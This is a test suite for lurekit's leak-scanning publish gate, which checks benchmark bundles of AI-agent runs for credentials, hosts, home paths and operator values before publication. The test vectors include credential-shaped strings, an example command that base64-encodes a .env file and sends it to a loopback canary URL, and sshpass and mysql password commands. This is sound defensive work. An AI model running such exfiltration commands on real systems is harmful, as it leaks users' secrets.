// Publish redaction gate patterns and bundle I/O hardening (ADR-0017 "Gate patterns",
// "Allow-URL", "Operator username", "Harness canary tokens", "Corpus block of a reduced
// bundle", "Run-dir reading", "Atomic bundle"; evidence-spec s5, s2.3). Offline. Credential-shaped
// test vectors are assembled at runtime, never written as literals, so a secret scanner over
// test/ never sees a token-shaped assignment.

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { existsSync, mkdirSync, readFileSync, readdirSync, rmSync, statSync, symlinkSync, writeFileSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import {
  gateAllowFor,
  planPublish,
  pseudonymizeMcpServers,
  readRunDir,
  scanForLeaks,
  writeBundle,
  type BundleFile,
  type GateAllow,
  type LeakKind,
} from '../src/report/publish.js';
import { main, type CliDeps } from '../src/cli.js';
import { BASE_ENV_ALLOW, ENV_VALUE_EXEMPT } from '../src/adapters/childEnv.js';
import { loadScenarioDir } from '../src/scenario/load.js';
import { corpusDigest } from '../src/scenario/digest.js';
import type { EvidenceRecord, RunManifest } from '../src/runner/types.js';
import { mkScratchSync } from './helpers/scratch.js';

const ROOT = fileURLToPath(new URL('..', import.meta.url));
const SHIPPED = loadScenarioDir(path.join(ROOT, 'scenarios')).scenarios;
const SOURCE = 'https://github.com/anthropics/claude-code/security/advisories/GHSA-4fgq-fpq9-mr3g';
const ALLOW: GateAllow = { urls: new Set([SOURCE]), hosts: new Set() };

const rep = (s: string, n: number): string => s.repeat(n);
const kindsOf = (text: string, allow: GateAllow = ALLOW, home?: string): LeakKind[] =>
  [...new Set(scanForLeaks([{ rel: 'f.json', text }], allow, home).map((l) => l.kind))].sort();

describe('gate patterns (ADR-0017 "Gate patterns")', () => {
  // [label, text, expected kinds]
  const positives: Array<[string, string, LeakKind[]]> = [
    ['email', 'contact alice.smith@corp-mail.com today', ['email']],
    ['email after an escaped newline', '"x\\nalice@corp-mail.com"', ['email']],
    ['scheme-less host:port', 'connect to build.internal-corp.com:8443 now', ['host']],
    ['scheme-less host/path', 'cloned gitlab.acme.io/team/repo yesterday', ['host']],
    ['ws:// URL', 'open wss://relay.acme.dev/socket', ['ws_url']],
    ['ssh:// URL', 'git clone ssh://deploy@ci.acme.dev/repo.git', ['ssh_url']],
    ['git+ssh:// URL', 'git+ssh://ci.acme.dev/repo.git', ['ssh_url']],
    ['scp-style git remote', 'git remote add origin git@github.com:operator/private-repo.git', ['git_ssh']],
    ['URL on a source host that is not a source URL', 'see https://github.com/operator/private-repo', ['url']],
    ['source URL with a different path suffix', `${SOURCE}/extra`, ['url']],
    ['Bearer credential', `Authorization: Bearer ${rep('a1B2c3D4', 4)}`, ['bearer']],
    ['JWT', `token=${'eyJ'}hbGciOiJIUzI1NiJ9.${'eyJ'}zdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fw`, ['jwt']],
    ['sk- key', `key ${'sk-'}ant-api03-${rep('x', 24)}`, ['token']],
    ['ghp_ token', `${'ghp'}_${rep('A1', 18)}`, ['token']],
    ['gho_ token', `${'gho'}_${rep('B2', 18)}`, ['token']],
    ['AKIA key id', `${'AKIA'}${'ABCDEFGHIJKLMNOP'}`, ['token']],
    ['xoxb- token', `${'xoxb'}-1234567890-abcdefghij`, ['token']],
    ['xoxp- token', `${'xoxp'}-1234567890-abcdefghij`, ['token']],
    ['AIza key', `${'AIza'}${rep('S', 35)}`, ['token']],
    ['glpat- token', `${'glpat'}-${rep('x', 20)}`, ['token']],
    ['PEM RSA private key header', `${'-----BEGIN '}RSA PRIVATE KEY-----`, ['private_key']],
    ['PEM OpenSSH private key header', `${'-----BEGIN '}OPENSSH PRIVATE KEY-----`, ['private_key']],
    ['PEM PKCS#8 private key header', `${'-----BEGIN '}PRIVATE KEY-----`, ['private_key']],
    // Block-4 adversarial review: spellings that used to slip past the gate.
    ['Bearer credential without a digit', `Authorization: Bearer ${rep('aBcDeFgH', 4)}`, ['bearer']],
    ['lowercase bearer scheme', `authorization: bearer ${rep('a1b2', 6)}`, ['bearer']],
    ['JWT with a short signature', `${'eyJ'}hbGciOiJIUzI1NiJ9.${'eyJ'}zdWIiOiIxIn0.abc`, ['jwt']],
    ['JWT with an empty signature (alg none)', `${'eyJ'}hbGciOiJub25lIn0.${'eyJ'}zdWIiOiIxMjM0NTY3ODkwIn0.`, ['jwt']],
    ['bare internal host name', 'the runner build-01.corp.example answered', ['host']],
    ['internal host with a port', 'db.prod.internal:5432', ['host']],
    ['.lan host', 'ssh into op-laptop.lan now', ['host']],
    ['scheme-less IPv4 with a port', 'reached 203.0.113.7:22 from the agent', ['host']],
    ['sk- key split by an escaped newline', `"${'sk-'}ant-api03-\\n${rep('A', 24)}"`, ['token']],
    ['sk- key split by a raw newline', `${'sk-'}ant-api03-\n  ${rep('A', 24)}`, ['token']],
    ['sk- key split by CRLF', `${'sk-'}\r\nant-api03${rep('A', 22)}`, ['token']],
    ['JSON \\u0040 email', '"ops\\u0040corp-mail.com"', ['email']],
    ['JSON \\/ escaped URL', '"https:\\/\\/evil-host.com\\/x"', ['url']],
    ['JSON \\/ escaped home path', '"\\/home\\/someone\\/x"', ['home_path']],
    ['JSON \\u002F escaped home path', '"\\u002Fhome\\u002Fsomeone"', ['home_path']],
    ['percent-encoded Windows home', 'C%3A%5CUsers%5Csomeone%5Cx', ['home_path']],
    ['double percent-encoded home', '%252Fhome%252Fsomeone', ['home_path']],
    // Second adversarial pass: other URL schemes, separators and internal addresses.
    ['ftp:// URL', 'ftp://files.acme.dev/x', ['url']],
    ['database URL with credentials', 'postgres://u:p@db.acme.io/app', ['credential', 'url']],
    ['smb:// URL on an internal host', 'smb://fileserver.corp/share', ['url']],
    ['sftp:// URL', 'sftp://deploy.acme.dev/up', ['ssh_url']],
    ['backslash scheme separator', 'https:\\\\evil-host.com/x', ['url']],
    ['triple-slash http URL', 'https:///evil-host.com/x', ['url']],
    ['protocol-relative URL', 'src=//evil-host.com/x', ['host']],
    ['private IPv4 without a port', 'gateway 192.168.1.1 and 10.0.0.5', ['host']],
    ['CGNAT IPv4 without a port', 'peer 100.101.102.103 joined', ['host']],
    // Block B12 (ADR-0017 amendment 2026-11-05): credential shapes by context, address gaps.
    ['MySQL glued -p<value> and a credential assignment', `mysql -u root -p${'S3cret'}Passw0rd! -h db && export DB_${'PASSWORD'}=${rep('h2', 6)}`, ['credential']],
    ['credential assignment alone', `set API_${'TOKEN'}=${rep('Ab1', 4)}`, ['credential']],
    ['scheme-less query with a base64 blob (requested path)', `{"requested":"/c/tok?k=${Buffer.from(`AWS_${'SECRET'}=abcdefghijklmnopqrstuvwxyz`).toString('base64')}"}`, ['credential']],
    ['--password= flag', `pg_dump --password=${rep('Pw1', 4)} db`, ['credential']],
    ['--token flag with a space', `cli login --token ${rep('Tk9', 4)}`, ['credential']],
    ['sshpass -p', `sshpass -p ${rep('s3', 4)} ssh host`, ['credential']],
    ['JSON member of the credential family', `{"API_${'TOKEN'}": "${rep('Zq7', 4)}"}`, ['credential']],
    ['JSON member with escaped quotes inside a string', `"{\\"api_${'key'}\\": \\"${rep('Zq7', 4)}\\"}"`, ['credential']],
    ['URL userinfo password on loopback', `curl http://admin:${rep('p4', 4)}@127.0.0.1:8080/`, ['credential']],
    ['40-hex blob in a loopback URL query', `http://127.0.0.1:1/x?s=${rep('ab12', 10)}`, ['credential']],
    ['base64 blob in a loopback URL path segment', `http://127.0.0.1:1/x/${rep('Ab1', 14)}/y`, ['credential']],
    ['scp to a private IPv4', 'scp . deploy@10.0.0.5:/srv', ['git_ssh', 'host']],
    ['ssh to a private IPv4', 'ssh deploy@10.0.0.5', ['host']],
    ['IPv4-mapped IPv6 spelling of a private IPv4', 'ssh ::ffff:10.0.0.7', ['host']],
    ['rsync to a private IPv4 remote', 'rsync -a . backup@10.20.30.40:/mnt', ['git_ssh', 'host']],
    ['scp-style remote on a public IPv4', 'rsync -a . backup@203.0.113.40:/mnt', ['git_ssh']],
    ['IPv6 unique-local literal', 'fd12:3456::1', ['host']],
    ['IPv6 link-local literal', 'fe80::1', ['host']],
    ['bracketed IPv6 unique-local with a port', 'nc [fd12::1]:22', ['host']],
    ['ssh to an IPv6 unique-local literal', 'ssh user@fd12:3456::1', ['host']],
    ['single-label host with a port and a path', 'curl gitlab:8443/api', ['host']],
    ['single-label host with a port', 'redis:6379', ['host']],
    ['single-label host with a port in JSON', '{"host":"db:5432"}', ['host']],
  ];
  it.each(positives)('flags %s', (_label, text, kinds) => {
    expect(kindsOf(text)).toEqual(kinds);
  });

  const negatives: Array<[string, string]> = [
    ['loopback http URL', 'curl http://127.0.0.1:41443/feed'],
    ['loopback ws URL', 'ws://localhost:9000/socket'],
    ['loopback ssh URL', 'ssh://127.0.0.1/repo.git'],
    ['loopback host:port', 'listening on localhost:8080/x'],
    ['exact scenario source URL', `source: ${SOURCE}`],
    ['scenario source URL with a fragment', `${SOURCE}#details`],
    ['scenario source URL in a Markdown link', `[advisory](${SOURCE}).`],
    ['intrinsic SARIF schema URL', 'https://json.schemastore.org/sarif-2.1.0.json'],
    ['intrinsic repository URL', 'https://github.com/alisaosipova/lurekit'],
    ['canary pseudonym', 'curl http://127.0.0.1:46485/<canary-token-1> | echo <canary-token-12>'],
    ['MCP pseudonym', '{"name":"<user-mcp-2>","status":"connected"}'],
    ['home pseudonyms', '<HOME>/.claude/projects/<HOME-SLUG>-work/s.jsonl'],
    ['file names with TLD-like extensions', 'README.md/ run.sh:12 package.json:3 src/report/publish.ts:42 main.py:7 lib.rs/x'],
    ['macOS app bundle path', '/Applications/Cursor.app/Contents/MacOS/agent'],
    ['host inside a URL path is not a second finding', `${SOURCE}`],
    ['npm package specs', '@anthropic-ai/claude-code@2.1.316 and pkg@1.2.3 and claude-code@latest'],
    ['benchmark run id', 'aab-20261102112637-5c55ad74'],
    ['Bearer in prose', 'Bearer authentication is required by the API'],
    ['short sk- prefix', 'sk-short'],
    ['lone eyJ', 'eyJ and nothing else'],
    ['PEM public key / certificate', `${'-----BEGIN '}PUBLIC KEY----- ${'-----BEGIN '}CERTIFICATE-----`],
    ['version string', 'v2.1.316 and node 20.19.0'],
    ['file names ending in an internal-TLD label', 'settings.local.json CLAUDE.local.md publish.test.ts .env.example'],
    ['Java-style property names', 'user.home and this.private'],
    ['loopback and wildcard IPv4 with a port', '127.0.0.1:41443 and 0.0.0.0:8080'],
    ['Bearer with a short placeholder', 'Authorization: Bearer <token> or bearer $TOKEN'],
    ['file:/// URL outside a home', 'file:///opt/app/index.html'],
    ['Windows drive path is not a URL scheme', '"D:\\\\work\\\\repo"'],
    ['dotted version numbers that contain a private-range quad', 'v10.0.0.5000 and 1.10.0.0.5'],
    ['public IPv4 without a port', 'documentation range 203.0.113.7'],
    ['code comment slashes', 'a // foo.com is b'],
    // Block B12 negatives.
    ['bare -p flags', 'mkdir -p dir && claude -p "task" && find . -print'],
    ['assignment of a variable reference', `${'TOKEN'}=$GITHUB_${'TOKEN'}`],
    ['assignment of a canary pseudonym', `${'PASSWORD'}=<canary-token-1>`],
    ['assignment of an x placeholder', `API_${'KEY'}=xxxxxxxxxxxx`],
    ['assignment of a REDACTED placeholder', `DB_${'SECRET'}="REDACTED_VALUE"`],
    ['JSON member holding a pseudonym', '{"token": "<canary-token-2>"}'],
    ['flag word in prose', 'the canary-token rewrite runs before the gate; --token is required'],
    ['digests at their keys', `scenario_version: sha256:${rep('ab', 32)} "input_digest": "${rep('9f', 32)}"`],
    ['Markdown anchor in a loopback URL fragment', `http://127.0.0.1:1/doc#${'section-'.repeat(8)}end`],
    ['curl command text with a shell substitution', 'curl http://127.0.0.1:39085/c/<canary-token-1>?k=$(cat .env | base64)'],
    ['public IPv4 without a port (unchanged decision)', 'ping 203.0.113.9'],
    ['IPv6 loopback and a global IPv6 literal', '::1 and 2001:db8::1'],
    ['clock times, drive letters, counters, digests and file:line refs', 'at 12:30 and C:123 and retry:3 and sha256:abcd and "port":8080 and file.ts:12 and T07:10:18Z'],
    ['loopback single-label host with a port', 'localhost:3000'],
  ];
  it.each(negatives)('does not flag %s', (_label, text) => {
    expect(kindsOf(text)).toEqual([]);
  });

  it('--allow-host opens every form on that host, nothing else', () => {
    const allow: GateAllow = { urls: new Set(), hosts: new Set(['corp-mail.com', 'github.com']) };
    expect(kindsOf('alice@corp-mail.com git@github.com:o/r.git https://github.com/o/r', allow)).toEqual([]);
    expect(kindsOf('bob@other-mail.com', allow)).toEqual(['email']);
  });

  it('a plain Set is still accepted as the allowed-host list (back-compat)', () => {
    expect(scanForLeaks([{ rel: 'a', text: 'https://evil.example.com/x' }], new Set(['evil.example.com']))).toEqual([]);
    expect(scanForLeaks([{ rel: 'a', text: 'https://evil.example.com/x' }], new Set())).toHaveLength(1);
  });

  it('never echoes a credential value in the finding', () => {
    const value = `${'ghp'}_${rep('Z9', 18)}`;
    const leaks = scanForLeaks([{ rel: 'a', text: value }], ALLOW);
    expect(JSON.stringify(leaks)).not.toContain(value);
  });

  it('B12: credential findings name the shape, never the value', () => {
    const value = rep('S3cr', 5);
    const text = `mysql -p${value}; export DB_${'PASSWORD'}=${value}; --password=${value}; http://u:${value}@127.0.0.1/; {"API_${'TOKEN'}": "${value}"}`;
    const leaks = scanForLeaks([{ rel: 'a', text }], ALLOW);
    expect(leaks.length).toBeGreaterThanOrEqual(5);
    expect(leaks.every((l) => l.kind === 'credential')).toBe(true);
    expect(JSON.stringify(leaks)).not.toContain(value);
  });

  it('B12: a blob in detector_hits[].matched.args / argv / requested is read structurally from an evidence record', () => {
    const blob = Buffer.from(`AWS_${'SECRET'}=abcdefghijklmnopqrstuvwxyz0123`).toString('base64');
    const rec = (matched: Record<string, unknown>) =>
      JSON.stringify({ detector_hits: [{ detector: 'canary_mcp_tool', matched, evidence_ref: 'x', at: 1 }] });
    const kinds = (text: string, rel = 'A/0/evidence.json') => scanForLeaks([{ rel, text }], ALLOW).map((l) => `${l.kind}: ${l.detail}`);
    expect(kinds(rec({ tool: 't', token: '<canary-token-1>', args: { nested: [{ v: blob }] } }))).toEqual(['credential: encoded blob in detector field matched.args']);
    expect(kinds(rec({ command: 'c', argv: ['--run', rep('ab12', 10)] }))).toEqual(['credential: encoded blob in detector field matched.argv']);
    expect(kinds(rec({ requested: `/c/<canary-token-1>/${rep('Ab1', 14)}` }))).toEqual(['credential: encoded blob in detector field matched.requested']);
    // Pseudonyms, a flag-like run (`--`) and a lower-case slug are not blobs; digests sit at other keys.
    expect(kinds(rec({ args: ['<canary-token-1>', `--${'a-'.repeat(25)}`, 'a-slug-of-lower-case-words-and-hyphens-only-1'], scenario_version: rep('ab', 32) }))).toEqual([]);
    // The same text in a file that is not an evidence record is judged by the text rules only.
    expect(kinds(rec({ args: { v: blob } }), 'report.json')).toEqual([]);
  });

  it('B12: --allow-host opens a single-label host, a private IPv6 literal and an IPv4 remote', () => {
    const allow: GateAllow = { urls: new Set(), hosts: new Set(['gitlab', 'fd12:3456::1', '203.0.113.40']) };
    expect(kindsOf('curl gitlab:8443/api and fd12:3456::1 and backup@203.0.113.40:/mnt', allow)).toEqual([]);
  });
});

describe('re-gating the published bundles (reports/*/, demo/*/)', () => {
  const bundleDirs = [
    ...readdirSync(path.join(ROOT, 'reports')).map((d) => path.join(ROOT, 'reports', d)),
    ...readdirSync(path.join(ROOT, 'demo')).map((d) => path.join(ROOT, 'demo', d)),
  ].filter((d) => statSync(d).isDirectory());

  function filesOf(dir: string, base = dir, acc: BundleFile[] = []): BundleFile[] {
    for (const e of readdirSync(dir, { withFileTypes: true })) {
      const p = path.join(dir, e.name);
      if (e.isDirectory()) filesOf(p, base, acc);
      else acc.push({ rel: path.relative(base, p).split(path.sep).join('/'), text: readFileSync(p, 'utf8') });
    }
    return acc;
  }

  it('finds the shipped bundles', () => {
    expect(bundleDirs.length).toBeGreaterThanOrEqual(10);
  });

  it.each(bundleDirs.map((d) => [path.relative(ROOT, d).split(path.sep).join('/'), d]))(
    '%s passes the stricter gate unchanged (zero findings)',
    (_rel, dir) => {
      const files = filesOf(dir);
      const manifest = JSON.parse(files.find((f) => f.rel === 'manifest.json')!.text) as RunManifest;
      const leaks = scanForLeaks(files, gateAllowFor(manifest, SHIPPED, []), '/home/lurekit-maintainer');
      expect(leaks).toEqual([]);
    },
  );
});

// --- planPublish level ----------------------------------------------------------------------

const RUN_ID = 'aab-gate-test';
const CORPUS_IDS = ['AAB-001', 'AAB-002'];
const digestOf = (ids: string[]): string => corpusDigest(SHIPPED.filter((sc) => ids.includes(sc.id)));
const sourceOf = (id: string): string => SHIPPED.find((sc) => sc.id === id)!.source.primary_url;

function manifest(): RunManifest {
  return {
    manifest_schema: '0.1',
    benchmark_run_id: RUN_ID,
    created_at: '2026-11-03T00:00:00.000Z',
    tool_version: '0.0.0',
    mode: 'full',
    config: { k: 1, vulnerable_if: 'any', isolation: 'container', budget_usd: null },
    corpus: { scenario_count: 2, scenario_ids: CORPUS_IDS, corpus_digest: digestOf(CORPUS_IDS) },
    profile: {
      agent: 'claude-code', agent_version: '@anthropic-ai/claude-code@2.1.309', model: 'claude-opus-4-8',
      permission_mode: 'plan', used_bare: false, mcp: 'none', hooks: 'none', skills: [], settings_digest: 'sha256:abc',
    },
    results: CORPUS_IDS.map((id) => ({
      scenario_id: id, name: `n-${id}`, source: sourceOf(id), detector: 'canary_command' as const,
      verdict: 'resisted' as const, confidence: '0/1 vulnerable', runs: 1, spend_usd: 0,
    })),
    totals: { resisted: 2, vulnerable: 0, degraded: 0, inconclusive: 0, spend_usd: 0 },
  };
}

function evidence(id: string, note: string): EvidenceRecord {
  return {
    evidence_schema: '0.1', benchmark_run_id: RUN_ID, scenario_id: id, scenario_version: 'sha256:s', repetition: 0,
    profile: manifest().profile, forbidden_effect: { detector: 'canary_command' }, detector_hits: [],
    benign: { check: 'text_in_transcript', ok: true, evidence_ref: 'ok' },
    observation: { raw_events_path: 'claude-stream.jsonl', tool_calls: [{ name: 'Bash', input: { command: note }, at: 1, source: 'stream' }], exit_code: 0 },
    timing: { started_at: 0, ended_at: 1, duration_ms: 1 },
    outcome: 'resisted',
  } as EvidenceRecord;
}

const contents = (notes: Record<string, string> = {}, m: RunManifest = manifest()) => ({
  manifestText: JSON.stringify(m, null, 2),
  evidence: CORPUS_IDS.map((id) => ({ rel: `${id}/0/evidence.json`, text: JSON.stringify(evidence(id, notes[id] ?? 'ls'), null, 2) })),
});

describe('planPublish: allow-URL, username, canaries, corpus block', () => {
  it('a scenario source URL passes; another URL on the same host fails unless --allow-host names it', () => {
    const c = contents({ 'AAB-002': `cat ${sourceOf('AAB-001')} https://github.com/operator/private-repo` });
    const plan = planPublish(c, { corpus: SHIPPED });
    expect(plan.ok).toBe(false);
    if (!plan.ok) expect(plan.leaks.map((l) => `${l.file}: ${l.kind}`)).toEqual(['AAB-002/0/evidence.json: url']);
    expect(planPublish(c, { corpus: SHIPPED, allowHosts: ['github.com'] }).ok).toBe(true);
  });

  it('a withheld scenario source URL no longer passes in the kept evidence', () => {
    const c = contents({ 'AAB-002': `see ${sourceOf('AAB-001')}` });
    expect(planPublish(c, { corpus: SHIPPED }).ok).toBe(true);
    const plan = planPublish(c, { corpus: SHIPPED, withhold: ['AAB-001'] });
    expect(plan.ok).toBe(false);
  });

  it('the username check runs without --redact-home for names of 4+ chars only', () => {
    const c = contents({ 'AAB-002': 'owner=opuser;' });
    const plan = planPublish(c, { corpus: SHIPPED, homeDir: '/home/opuser' });
    expect(plan.ok).toBe(false);
    if (!plan.ok) expect(plan.leaks.map((l) => l.kind)).toEqual(['home_user']);
    expect(planPublish(contents({ 'AAB-002': 'owner=op;' }), { corpus: SHIPPED, homeDir: '/home/op' }).ok).toBe(true);
    expect(planPublish(contents({ 'AAB-002': 'owner=op;' }), { corpus: SHIPPED, homeDir: '/home/op', redactHome: true }).ok).toBe(false);
  });

  it('the username inside a host name is a finding', () => {
    const plan = planPublish(contents({ 'AAB-002': 'hostname: opuser-laptop' }), { corpus: SHIPPED, homeDir: '/home/opuser' });
    expect(plan.ok).toBe(false);
    if (!plan.ok) expect(plan.leaks.map((l) => l.kind)).toEqual(['home_user']);
    const plan2 = planPublish(contents({ 'AAB-002': 'ssh opuser-laptop.lan' }), { corpus: SHIPPED, homeDir: '/home/opuser' });
    expect(plan2.ok).toBe(false);
    if (!plan2.ok) expect(plan2.leaks.map((l) => l.kind).sort()).toEqual(['home_user', 'host']);
  });

  it('pseudonymises every aab-<word>-<hex> minted value; the run id is kept', () => {
    const skill = `aab-skill-${'0123456789abcdef'}`;
    const web = `aab-web-${'a1b2c3d4e5f6a1b2c3d4e5f6'}`;
    const plan = planPublish(contents({ 'AAB-001': `grep ${skill} x`, 'AAB-002': `curl http://127.0.0.1:1/${web}` }), { corpus: SHIPPED });
    expect(plan.ok).toBe(true);
    if (!plan.ok) return;
    const all = plan.files.map((f) => f.text).join('\n');
    expect(all).not.toContain(skill);
    expect(all).not.toContain(web);
    expect(all).toContain('<canary-token-1>');
    expect(all).toContain(RUN_ID);
    expect(plan.canaryTokenReplacements).toBe(2);
  });

  it('a reduced bundle filters corpus.scenario_ids and recomputes corpus_digest; corpus_digest_full keeps the run digest', () => {
    const plan = planPublish(contents(), { corpus: SHIPPED, exclude: ['AAB-002'] });
    expect(plan.ok).toBe(true);
    if (!plan.ok) return;
    const m = JSON.parse(plan.files.find((f) => f.rel === 'manifest.json')!.text) as RunManifest;
    expect(m.corpus).toEqual({
      scenario_count: 1,
      scenario_ids: ['AAB-001'],
      corpus_digest: digestOf(['AAB-001']),
      corpus_digest_full: digestOf(CORPUS_IDS),
    });
    for (const f of plan.files.filter((x) => x.rel !== 'index.md')) {
      const hits = f.text.split('\n').filter((l) => l.includes('AAB-002')).map((l) => l.trim());
      // Only the manifest's (and report.json's embedded manifest's) `excluded` array names it.
      expect(hits.filter((h) => h !== '"AAB-002"'), f.rel).toEqual([]);
    }
  });

  it('fails closed when the scenario corpus does not reproduce the run digest, or is missing', () => {
    const m = manifest();
    m.corpus.corpus_digest = 'deadbeef';
    const plan = planPublish(contents({}, m), { corpus: SHIPPED, withhold: ['AAB-001'] });
    expect(plan.ok).toBe(false);
    if (!plan.ok) expect(plan.error).toMatch(/does not reproduce the run's corpus_digest.*--scenarios/);
    const none = planPublish(contents(), { withhold: ['AAB-001'] });
    expect(none.ok).toBe(false);
    if (!none.ok) expect(none.error).toMatch(/not found in the scenario corpus/);
    // Without a drop the corpus block is a byte copy and no corpus is needed.
    expect(planPublish(contents()).ok).toBe(true);
  });
});

describe('B12 operator values (env_value) and evidence count', () => {
  const VALUE = `${'Op'}${rep('x7', 11)}`; // 24 characters, built at runtime
  const spellings = (v: string): Record<string, string> => ({
    raw: v,
    json: JSON.stringify(v).slice(1, -1),
    percent: encodeURIComponent(v),
    base64: Buffer.from(v).toString('base64'),
    base64url: Buffer.from(v).toString('base64url'),
    unpadded: Buffer.from(v).toString('base64').replace(/=+$/, ''),
  });
  const withEnv = (forwarded: string[] | undefined, note: string) => {
    const c = contents({ 'AAB-002': note });
    c.evidence = c.evidence.map((f) => {
      const rec = JSON.parse(f.text) as EvidenceRecord;
      if (forwarded) rec.observation!.env_forwarded = forwarded;
      return { rel: f.rel, text: JSON.stringify(rec, null, 2) };
    });
    return c;
  };
  const leaksOf = (plan: ReturnType<typeof planPublish>) => (plan.ok ? [] : plan.leaks.map((l) => `${l.file}: ${l.kind}: ${l.detail}`));

  it.each(Object.entries(spellings(`${VALUE}+/=`)))('finds the %s spelling of a forwarded value and names only the variable', (_label, spelled) => {
    const value = `${VALUE}+/=`;
    const plan = planPublish(withEnv(['ANTHROPIC_API_KEY', 'PATH'], `echo ${spelled}`), { corpus: SHIPPED, operatorEnv: { ANTHROPIC_API_KEY: value } });
    expect(leaksOf(plan)).toEqual(['AAB-002/0/evidence.json: env_value: value of environment variable ANTHROPIC_API_KEY present (value redacted)']);
    expect(JSON.stringify(plan)).not.toContain(value);
  });

  it('no finding for a name absent from env_forwarded, a process basic, an exempt name, a short value, the model, or a replay record', () => {
    const base = BASE_ENV_ALLOW.names![0];
    const exempt = ENV_VALUE_EXEMPT[0];
    const ok = (forwarded: string[] | undefined, env: Record<string, string>, note = `echo ${VALUE}`) => planPublish(withEnv(forwarded, note), { corpus: SHIPPED, operatorEnv: env }).ok;
    expect(ok(['OTHER_NAME'], { ANTHROPIC_API_KEY: VALUE })).toBe(true);
    expect(ok([base], { [base]: VALUE })).toBe(true);
    expect(ok([exempt], { [exempt]: VALUE })).toBe(true);
    expect(ok(['ANTHROPIC_API_KEY'], { ANTHROPIC_API_KEY: 'abcdefg' }, 'echo abcdefg')).toBe(true);
    expect(ok(['ANTHROPIC_API_KEY'], { ANTHROPIC_API_KEY: 'claude-opus-4-8' }, 'echo claude-opus-4-8')).toBe(true);
    expect(ok(undefined, { ANTHROPIC_API_KEY: VALUE })).toBe(true);
    // Control: the same note with the name forwarded is a finding.
    expect(ok(['ANTHROPIC_API_KEY'], { ANTHROPIC_API_KEY: VALUE })).toBe(false);
  });

  it('settings env values are checked for every name; a dropped scenario\'s values are not', () => {
    const c = contents({ 'AAB-002': `echo ${VALUE}` });
    const plan = planPublish({ ...c, settingsEnv: [{ rel: 'AAB-001/0/claude-settings.json', name: 'MY_PROXY_PASS', value: VALUE }] }, { corpus: SHIPPED });
    expect(leaksOf(plan)).toEqual(['AAB-002/0/evidence.json: env_value: value of environment variable MY_PROXY_PASS present (value redacted)']);
    const dropped = planPublish({ ...c, settingsEnv: [{ rel: 'AAB-001/0/claude-settings.json', name: 'MY_PROXY_PASS', value: VALUE }] }, { corpus: SHIPPED, withhold: ['AAB-001'] });
    expect(dropped.ok).toBe(true);
  });

  it('evidence count: fewer files than planned repetitions warns; none refuses unless --allow-no-evidence', () => {
    const m = manifest();
    m.results[0].runs = 3;
    m.results[0].confidence = '0/3 vulnerable';
    const c = contents({}, m);
    const one = planPublish({ ...c, evidence: c.evidence.slice(0, 1) }, { corpus: SHIPPED, runDir: 'runs/x' });
    expect(one.ok).toBe(true);
    if (one.ok) {
      expect(one.warnings).toEqual(['publish: 1 evidence file(s) for 4 planned repetition(s); report.md cites evidence files that are not in the bundle']);
      expect(one.evidenceFound).toBe(1);
      expect(one.evidenceExpected).toBe(4);
    }
    const none = planPublish({ ...c, evidence: [] }, { corpus: SHIPPED, runDir: 'runs/x' });
    expect(none.ok).toBe(false);
    if (!none.ok) {
      expect(none.error).toBe('no evidence files under runs/x (0 of 4 planned repetitions); a bundle without evidence cannot be audited');
      expect(none.next).toBe('lurekit publish runs/x --allow-no-evidence   (report-only copy, e.g. the shipped demo)');
      expect(none.leaks).toEqual([]);
    }
    const allowed = planPublish({ ...c, evidence: [] }, { corpus: SHIPPED, runDir: 'runs/x', allowNoEvidence: true });
    expect(allowed.ok).toBe(true);
    if (allowed.ok) {
      expect(allowed.files.map((f) => f.rel)).toEqual(['manifest.json', 'report.md', 'report.json', 'report.sarif', 'index.md']);
      expect(allowed.files.find((f) => f.rel === 'index.md')!.text).toContain(
        '## Evidence\n\nno evidence files published (--allow-no-evidence): 0 of 4 planned repetition(s); the evidence lines in report.md cite files that are not in this bundle',
      );
      expect(allowed.warnings).toEqual([]);
    }
    // Full evidence (the unmodified manifest: one file per planned repetition): no warning, and
    // the flag changes no byte.
    const full = planPublish(contents(), { corpus: SHIPPED });
    const flagged = planPublish(contents(), { corpus: SHIPPED, allowNoEvidence: true });
    expect(full.ok && flagged.ok).toBe(true);
    if (full.ok && flagged.ok) {
      expect(full.warnings).toEqual([]);
      expect(flagged.files).toEqual(full.files);
      expect(full.files.find((f) => f.rel === 'index.md')!.text).not.toContain('## Evidence');
    }
  });
});

describe('B12 schema descriptions and entry-page wording (DOCS-03, DOCS-14)', () => {
  it('manifest.schema.json describes `excluded` as dropped from corpus.scenario_ids and documents corpus_digest_full', () => {
    const schema = JSON.parse(readFileSync(path.join(ROOT, 'schemas', 'manifest.schema.json'), 'utf8')) as {
      properties: { excluded: { description: string }; corpus: { properties: { corpus_digest_full: { description?: string } } } };
    };
    expect(schema.properties.excluded.description).not.toContain('stays in');
    expect(schema.properties.excluded.description).toContain('from corpus.scenario_ids');
    expect(schema.properties.corpus.properties.corpus_digest_full.description).toContain('Published reduced bundles only');
  });

  it('README, the launch article and the publishing guide state what the gate checks', () => {
    const readme = readFileSync(path.join(ROOT, 'README.md'), 'utf8');
    const article = readFileSync(path.join(ROOT, 'docs', 'launch', 'article-lurekit-2026-11.md'), 'utf8');
    const guide = readFileSync(path.join(ROOT, 'docs', 'guide', 'publishing.md'), 'utf8');
    for (const text of [readme, article, guide]) {
      expect(text).not.toContain('keeps those inputs safe');
      expect(text).not.toMatch(/non-allowlisted hosts,\s+credential-shaped tokens and home paths/);
      expect(text).toContain('not exactly a scenario source URL');
    }
    expect(guide).toMatch(/^\| `credential` \|/m);
    expect(guide).toMatch(/^\| `env_value` \|/m);
    expect(guide).toContain('--allow-no-evidence');
  });
});

describe('pseudonymizeMcpServers numbering (no per-name Set rebuild)', () => {
  it('assigns increasing placeholders, skipping reserved ones, for many names', () => {
    const servers = Array.from({ length: 3000 }, (_, i) => ({ name: `srv-${i}`, status: 'connected', source: 'user' }));
    const value = { mcp_servers: servers };
    const names = new Map<string, string>();
    const reserved = new Set(['<user-mcp-2>', '<user-mcp-4>']);
    // Hang guard only (ADR-0012 amendment 2026-11-05, rule a.3): a wall-clock performance bound
    // in the unit suite measures the runner, not the code. The quadratic per-name Set rebuild
    // this test was written against is covered by the functional expectations below.
    const HANG_GUARD_MS = 10_000;
    const t0 = Date.now();
    expect(pseudonymizeMcpServers(value, names, reserved)).toBe(3000);
    expect(Date.now() - t0).toBeLessThan(HANG_GUARD_MS);
